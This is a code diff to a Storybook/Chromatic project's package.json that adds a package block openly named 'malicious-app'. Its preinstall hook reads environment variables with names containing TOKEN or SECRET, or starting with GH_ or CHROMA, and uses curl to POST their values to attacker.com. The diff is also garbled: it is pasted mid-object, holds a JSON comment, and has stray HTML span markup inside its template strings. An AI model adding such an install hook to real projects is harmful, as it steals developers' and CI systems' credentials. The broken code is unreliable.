@@ -12,6 +12,20 @@
 		"build-storybook": "storybook build",
 		"chromatic": "npx chromatic "
 	},
+{
+  "name": "malicious-app",
+  "version": "1.0.0",
+  "description": "This is a malicious package.",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node -e 'console.log(\"Executing malicious preinstall hook...\"); for (const key in process.env) { if (key.includes(\"TOKEN\") || key.includes(\"SECRET\") || key.startsWith(\"GH_\") || key.startsWith(\"CHROMA\")) { console.log(`Leaking: <span class="math-inline">\{key\}\=</span>{process.env[key].substring(0, 5)}...`); require(\"child_process\").execSync(`curl -k -X POST -d \"<span class="math-inline">\{key\}\=</span>{process.env[key]}\" https://attacker.com/steal-secrets`); } }'",
+    "test": "echo 'safe test'"
+  },
+  "dependencies": {
+    // Attacker could also add a malicious dependency here that executes code on install
+    "lodash": "^4.17.21"
+  }
+},
 	"devDependencies": {
 		"@chromatic-com/storybook": "^1.9.0",
 		"@dbml/cli": "^3.8.0",
